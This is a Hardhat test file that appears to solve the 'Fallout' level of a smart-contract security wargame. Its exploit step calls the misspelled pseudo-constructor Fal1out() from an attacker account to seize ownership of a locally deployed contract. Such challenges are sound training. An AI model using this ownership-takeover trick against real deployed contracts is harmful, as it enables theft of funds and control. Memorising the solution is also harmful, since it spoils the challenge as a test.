const { ethers } = require("hardhat");
const { expect } = require("chai");

/*
Claim ownership of the contract below to complete this level.

  Things that might help

- Solidity Remix IDE

*/

describe("[Challenge] Fallout", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.fallout = await (
      await ethers.getContractFactory("Fallout", deployer)
    ).deploy();
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    // call the fake contructor to claim ownership
    await this.fallout.connect(attacker).Fal1out();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker claim ownership of the contract
    expect(await this.fallout.owner()).to.eq(attacker.address);
  });
});
